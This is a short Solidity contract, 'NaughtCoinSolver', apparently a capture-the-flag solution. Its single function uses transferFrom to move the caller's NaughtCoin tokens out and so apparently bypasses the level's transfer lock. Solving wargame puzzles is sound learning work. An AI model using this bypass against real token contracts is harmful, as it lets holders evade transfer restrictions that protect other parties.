// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinSolver {
    function withdraw(IERC20 _naughtcoin, uint256 _amount) public {
        _naughtcoin.transferFrom(msg.sender, address(this), _amount);
    }
}